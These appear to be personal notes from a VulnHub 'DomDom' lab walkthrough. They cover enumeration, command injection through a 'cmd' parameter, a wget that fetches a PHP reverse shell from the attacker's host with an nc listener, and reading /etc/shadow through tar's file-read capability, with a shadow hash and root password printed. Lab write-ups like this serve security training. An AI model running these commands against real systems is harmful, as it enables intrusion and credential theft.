
---
DomDom URL: https://www.vulnhub.com/entry/domdom-1,328/

\[OS]: Ubuntu
\[Web-Technology]: Apache 2.4.18
\[Hostname]:  DomDom
\[IP]:  192.168.56.118
\[USERS]:   
\[CREDENTIALS]:  

---
\[To-Try LIST]:  




---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: DomDom
|_http-server-header: Apache/2.4.18 (Ubuntu)


--- 

\[Web Services Enumeration]:   

View Page Source - Nothing

Login Form - hydra/medusa? - command injection

```bash

# dir enum
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30


/server-status        (Status: 403) [Size: 302]

#file enum
dirb $URL
+ http://192.168.56.118/admin.php (CODE:200|SIZE:329)                                        
+ http://192.168.56.118/index.php (CODE:200|SIZE:694)   

```

![[Pasted image 20251101113756.png]]
```bash

## Capture login attempt in burpsuite and forward to repeated

## Now right now we are posting index.php but we could post /admin.php instead


```
![[Pasted image 20251101113935.png]]
```bash
#/admin.php response is running a script name - "cmd"

# try modify param "cmd" in request
name=admin&username=admin&password=admin&access=access&cmd=whoami

#Response
```
![[Pasted image 20251101114237.png]]

Verified command injection - now run revshell
```bash

Host revshell on local server
cmd=wget http://192.168.56.101:8000/php-reverse-shell.php && chmod 777 php-reverse-shell.php

# Locally
nc -nlvp 1234

```

![[Pasted image 20251101115800.png]]

![[Pasted image 20251101120121.png]]

---


\[OTHER / PRIVILEGE-ESCALATION]:   


```bash
whoami - www-data
#get persistence / tty

ls /home - users domom

www-data@ubuntu:/home/domom/Desktop$ ls
README.md # permission denied when I cat


getcap -r / 2>/dev/null
--> /bin/tar = cap_dac_read_search+ep


# DAC (discretionary access control) means we can read any file on system because tar can compress/compress and take those arguments
cd /tmp
/bin/tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat /tmp/etc/shadow

# We have hashes for www-data (me) and also domom and root
domom:$6$qpA3jRt6$6PknPPduYhSOwN4BYvAiL4eQamIHxFTvVIR9E32D/qxtVwx8M.zvYeycxCxBiuDvBzZQXmrZ/1ZyUHqMw2x530:18088:0:99999:7:::

#try jtr and hc - taking ages in the mean time im going to read the README.md which I probably should've done first

/bin/tar -cvf readme.tar /home/domom/Desktop/README.md 


www-data@ubuntu:/tmp$ cat /tmp/home/domom/Desktop/README.md 
Hi Dom, This is the root password:

Mj7AGmPR-m&Vf>Ry{}LJRBS5nc+*V.#a

# Yeah okay i was not gonna crack that

```

![[Pasted image 20251101122421.png]]





--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
